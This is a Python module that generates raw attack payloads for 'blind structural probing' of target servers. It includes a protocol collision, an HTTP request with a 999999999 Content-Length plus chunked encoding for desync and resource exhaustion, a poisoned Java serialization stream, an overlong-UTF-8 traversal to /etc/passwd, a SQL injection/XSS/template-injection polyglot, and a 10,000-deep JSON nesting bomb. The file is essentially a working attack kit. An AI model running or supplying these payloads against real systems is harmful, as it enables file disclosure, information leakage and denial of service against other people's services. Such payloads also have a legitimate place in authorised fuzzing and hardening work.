"""
Chaos Matrix — Entropy vectors for blind structural probing.
Each vector is a structural impossibility designed to force
target parsers to bleed internal state via crash traces.
"""
import struct


class ChaosMatrix:
    """Generates payload vectors for zero-knowledge probing."""

    @staticmethod
    def generate_vectors() -> dict[str, bytes]:
        return {
            # 1. PROTOCOL COLLISION
            # Forces HTTP servers to handle SSH handshakes, or SSH to handle HTTP.
            # Strips away silent drops; forces protocol multiplexers to throw unhandled exceptions.
            "proto_collision": (
                b"SSH-2.0-OpenSSH_9.2\r\nGET / HTTP/1.1\r\nHost: \x00\r\n\r\n"
            ),

            # 2. DESYNC ALLOCATOR
            # Claims a massive payload, delivers 1 byte.
            # Tests pre-allocation OOM, Slowloris hang, or chunked state desync.
            "desync_allocator": (
                b"POST / HTTP/1.1\r\n"
                b"Host: localhost\r\n"
                b"Content-Length: 999999999\r\n"
                b"Transfer-Encoding: chunked\r\n\r\n"
                b"0\r\n\r\n\x00"
            ),

            # 3. JAVA DEATH RATTLE
            # AC ED 00 05 = Java Serialization Magic Bytes.
            # Forces EOFException or ClassNotFoundException from deserializing middleware.
            "java_magic_poison": (
                b"\xac\xed\x00\x05\x73\x72\x00\x0a\x6a\x61\x76\x61"
                b"\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x70"
                b"\x78\x70" + b"\xff" * 50
            ),

            # 4. PATH COLLAPSE
            # Recursive UTF-8 overlong path traversal. Forces 500 or /etc/passwd leak.
            "path_collapse": (
                b"GET /" + b"%c0%af.." * 150 + b"/etc/passwd HTTP/1.1\r\n\r\n"
            ),

            # 5. POLYGLOT RUPTURE
            # Simultaneously invalid SQL, JSON, XML, and SSTI syntax.
            # Whichever parser touches it first throws its stack trace.
            "polyglot_rupture": (
                b"'\"/><script>\\x00</script><![CDATA[${7*7}]]>"
                b" {{7*7}} {'a':1, /*} UNION SELECT NULL--"
            ),

            # 6. JSON RECURSION BOMB
            # Billion Laughs variant for JSON parsers.
            "json_recursion_depth": (
                b'{"a":' * 10000 + b'1' + b'}' * 10000
            ),
        }

    @staticmethod
    def get_vector_names() -> list[str]:
        return list(ChaosMatrix.generate_vectors().keys())

    @staticmethod
    def get_vector(name: str) -> bytes | None:
        return ChaosMatrix.generate_vectors().get(name)
